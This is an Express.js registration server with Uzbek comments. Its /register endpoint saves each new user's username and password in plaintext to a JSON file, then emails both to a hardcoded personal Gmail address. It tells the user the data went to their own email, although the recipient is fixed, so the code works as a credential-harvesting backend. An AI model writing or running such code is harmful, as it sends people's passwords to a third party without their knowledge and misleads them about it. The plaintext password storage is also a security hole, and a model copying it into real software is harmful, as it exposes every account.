const express = require('express');
const nodemailer = require('nodemailer');
const fs = require('fs');
const app = express();
const port = 3000;

// JSON faylini ishlatish uchun middleware
app.use(express.json());

// Ma'lumotlarni saqlash uchun JSON fayl
const USERS_FILE = './users.json';

// Nodemailer sozlamalari (email yuborish uchun)
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'SIZNING_EMAIL@gmail.com', // O'zingizning Gmail manzilingizni kiriting
        pass: 'SIZNING_APP_PASSWORD'     // Gmail App Password (quyida tushuntiriladi)
    }
});

// Ro'yxatdan o'tish endpoint'i
app.post('/register', async (req, res) => {
    const { username, password } = req.body;
    let users = [];

    // JSON fayldan ma'lumotlarni o'qish
    try {
        users = JSON.parse(fs.readFileSync(USERS_FILE));
    } catch (error) {
        users = [];
    }

    // Login allaqachon mavjudligini tekshirish
    if (users.some(user => user.username === username)) {
        return res.json({ success: false, message: 'Bu login allaqachon ro‘yxatdan o‘tgan!' });
    }

    // Yangi foydalanuvchi qo'shish
    users.push({ username, password });
    fs.writeFileSync(USERS_FILE, JSON.stringify(users));

    // Email xabarni tayyorlash
    const mailOptions = {
        from: 'SIZNING_EMAIL@gmail.com', // Yuboruvchi email
        to: 'behruzrahmatov298@gmail.com', // Sizning emailingiz
        subject: 'Yangi foydalanuvchi ro‘yxatdan o‘tdi',
        text: `Yangi foydalanuvchi:\nLogin: ${username}\nParol: ${password}`
    };

    // Email yuborish
    try {
        await transporter.sendMail(mailOptions);
        res.json({ success: true, message: 'Ro‘yxatdan o‘tish muvaffaqiyatli! Ma\'lumotlar emailingizga yuborildi.' });
    } catch (error) {
        console.error('Email yuborishda xatolik:', error);
        res.json({ success: false, message: 'Email yuborishda xatolik!' });
    }
});

// Serverni ishga tushirish
app.listen(port, () => {
    console.log(`Server http://localhost:${port} da ishlamoqda`);
});
